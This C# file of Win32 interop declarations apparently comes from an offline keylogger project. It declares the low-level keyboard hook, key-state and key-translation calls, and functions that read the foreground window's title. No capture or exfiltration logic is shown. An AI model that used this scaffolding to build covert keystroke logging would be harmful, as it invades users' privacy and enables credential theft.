using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Offline.Keyloggers
{
    internal static class Imports
    {
        #region"user32"
        private const string user32 = "user32.dll";
		internal static string CurrentActiveWindowTitle;

		internal const short WM_KEYDOWN = 0x100;
		internal const int WM_SYSKEYDOWN = 0x104;

		[DllImport(user32)]
		internal extern static bool UnhookWindowsHookEx(IntPtr hook);

		[DllImport(user32)]
		internal static extern IntPtr GetKeyboardLayout(uint idThread);

		[DllImport(user32)]
		internal static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
		[DllImport(user32)]
		[return: MarshalAs(UnmanagedType.Bool)]
		internal static extern bool GetKeyboardState(byte[] lpKeyState);

		[DllImport(user32)]
		internal static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
		[DllImport(user32)]
		internal static extern uint MapVirtualKey(uint uCode, uint uMapType);

		[DllImport(user32, CharSet = CharSet.Auto, SetLastError = true)]
		internal extern static IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);

		[DllImport(user32)]
		internal static extern IntPtr GetForegroundWindow();

		[DllImport(user32)]
		internal static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

		[DllImport(user32)]
		internal static extern short GetKeyState(int keyCode);

		[DllImport(user32)]
		internal static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

		[StructLayout(LayoutKind.Sequential)]
		internal struct KBDLLHOOKSTRUCT
		{
			public Keys key;
			public int scanCode;
			public int flags;
			public int time;
			public IntPtr extra;
		}

		internal delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
		internal static IntPtr ptrHook;
		internal static LowLevelKeyboardProc callback;
        #endregion
    }
}
